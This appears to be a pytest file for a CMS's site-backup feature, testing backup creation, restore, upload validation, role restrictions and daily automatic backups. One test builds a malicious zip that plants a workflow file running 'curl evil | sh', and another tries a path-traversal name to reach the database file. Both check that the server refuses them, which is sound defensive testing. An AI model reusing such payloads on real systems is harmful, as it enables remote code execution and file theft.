"""CMS backups: content files and Mas's own data of a site, kept on the server and put back on request."""

from __future__ import annotations

import io
import json
import zipfile

from test_cms import env, login  # noqa: F401  (env is a fixture)

from mas import cms_backup

BASE = "/api/cms/sites/site"


def seed(db):
    db.set_setting("goals:site", json.dumps({"paths": ["/merci"], "funnel": []}))
    db.set_setting("cookies:site", json.dumps({"position": "bottom"}))
    db.set_setting("notify:site", json.dumps({"secret": "sealed"}))
    with db.tx() as c:
        c.execute("INSERT INTO site_stats (app_id, day, requests, pageviews, visitors, pages, updated_at, countries, sources, devices) "
                  "VALUES ('site', '2026-11-01', 10, 8, 5, '{}', 'x', '{}', '{}', '{}')")
        c.execute("INSERT INTO site_stats (app_id, day, requests, pageviews, visitors, pages, updated_at, countries, sources, devices) "
                  "VALUES ('other', '2026-11-01', 99, 99, 99, '{}', 'x', '{}', '{}', '{}')")


def test_backup_round_trip(env):
    client, db, gh = env
    h = {"x-csrf-token": login(client)}
    seed(db)
    assert client.get(f"{BASE}/backups", headers=h).json() == {"items": [], "auto": False}

    made = client.post(f"{BASE}/backups", headers=h)
    assert made.status_code == 200, made.text
    name = made.json()["name"]
    items = client.get(f"{BASE}/backups", headers=h).json()["items"]
    assert [i["name"] for i in items] == [name] and items[0]["files"] >= 1 and items[0]["rows"] == 1

    # the zip holds the content and the data, but not the notification secret
    raw = client.get(f"{BASE}/backups/{name}", headers=h).content
    z = zipfile.ZipFile(io.BytesIO(raw))
    assert "manifest.json" in z.namelist() and any(n.startswith("content/") for n in z.namelist())
    data = json.loads(z.read("data.json"))
    assert "goals:site" in data["settings"] and "notify:site" not in data["settings"]

    # change content and data, then restore both
    before = dict(gh.files)
    page = next(p for p in before if p.startswith("content/") and p.endswith(".json"))
    gh.files[page] = b'{"changed": true}'
    db.set_setting("goals:site", None)
    with db.tx() as c:
        c.execute("DELETE FROM site_stats WHERE app_id = 'site'")
    r = client.post(f"{BASE}/backups/{name}/restore", json={}, headers=h)
    assert r.status_code == 200, r.text
    body = r.json()
    assert body["files"] >= 1 and body["rows"]["site_stats"] == 1 and body["safety"]
    assert gh.files[page] == before[page]
    assert json.loads(db.get_setting("goals:site"))["paths"] == ["/merci"]
    assert db.get_setting("notify:site") is not None  # untouched
    with db.tx() as c:
        assert c.execute("SELECT requests FROM site_stats WHERE app_id = 'other'").fetchone()[0] == 99
    # the state before the restore was saved first
    assert any(i["name"] == body["safety"] for i in client.get(f"{BASE}/backups", headers=h).json()["items"])


def test_restore_only_what_was_asked_and_refuses_strangers(env):
    client, db, gh = env
    h = {"x-csrf-token": login(client)}
    seed(db)
    name = client.post(f"{BASE}/backups", headers=h).json()["name"]
    db.set_setting("goals:site", None)
    r = client.post(f"{BASE}/backups/{name}/restore", json={"data": False, "content": True}, headers=h)
    assert r.status_code == 200 and r.json()["rows"] is None
    assert db.get_setting("goals:site") is None  # data was not asked
    assert client.post(f"{BASE}/backups/{name}/restore", json={"data": False, "content": False}, headers=h).status_code == 400

    # a file that is not a Mas backup, and a backup of another site
    assert client.post(f"{BASE}/backups/upload", content=b"hello", headers=h).status_code == 400
    other = cms_backup.build(db, None, "other")
    assert client.post(f"{BASE}/backups/upload", content=other, headers=h).status_code == 400
    mine = cms_backup.build(db, None, "site")
    up = client.post(f"{BASE}/backups/upload", content=mine, headers=h)
    assert up.status_code == 200 and up.json()["name"].endswith(".zip")

    # names are not paths
    assert client.get(f"{BASE}/backups/..%2Fmas.db", headers=h).status_code in (400, 404)
    assert client.delete(f"{BASE}/backups/{name}", headers=h).status_code == 200
    assert client.get(f"{BASE}/backups/{name}", headers=h).status_code == 400


def test_a_backup_cannot_write_where_the_cms_could_not(env):
    client, db, gh = env
    h = {"x-csrf-token": login(client)}
    evil = io.BytesIO()
    with zipfile.ZipFile(evil, "w") as z:
        z.writestr("manifest.json", json.dumps({"format": 1, "app_id": "site", "rows": {}, "files": 1}))
        z.writestr("data.json", json.dumps({"tables": {}, "settings": {}}))
        z.writestr("content/.github/workflows/x.yml", "run: curl evil | sh")
    name = client.post(f"{BASE}/backups/upload", content=evil.getvalue(), headers=h).json()["name"]
    r = client.post(f"{BASE}/backups/{name}/restore", json={}, headers=h)
    assert r.status_code == 400
    assert ".github/workflows/x.yml" not in gh.files


def test_editors_cannot_touch_backups(env):
    client, db, gh = env
    from mas import auth
    uid = db.create_user("ed", auth.hash_password("correct horse battery"), role="editor")
    db.set_user_apps(uid, ["site"])
    h = {"x-csrf-token": login(client, "ed", "correct horse battery")}
    assert client.get(f"{BASE}/backups", headers=h).status_code in (401, 403)
    assert client.post(f"{BASE}/backups", headers=h).status_code in (401, 403)


def test_automatic_backup_runs_once_a_day(env):
    client, db, gh = env
    h = {"x-csrf-token": login(client)}
    assert client.put(f"{BASE}/backups/auto", json={"on": True}, headers=h).json() == {"auto": True}
    cms = client.app.state.cms
    assert cms_backup.tick(db, cms) == ["site"]
    assert cms_backup.tick(db, cms) == []  # done today
    items = client.get(f"{BASE}/backups", headers=h).json()
    assert items["auto"] and [i["auto"] for i in items["items"]] == [True]
